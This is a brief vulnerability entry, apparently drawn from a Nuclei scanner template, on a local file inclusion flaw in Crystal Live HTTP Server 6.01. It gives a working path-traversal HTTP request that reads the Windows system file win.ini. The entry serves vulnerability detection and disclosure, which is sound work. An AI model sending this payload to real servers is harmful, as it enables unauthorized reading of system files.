# Vulnerability: Crystal Live HTTP Server 6.01 - Local File Inclusion
**Classification:** CWE-23
**Source:** Nuclei Template (`crystal-live-server-lfi.yaml`)

## Description
Crystal Live HTTP Server 6.01 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/../../../../../../../../../../../../windows/win.ini
```

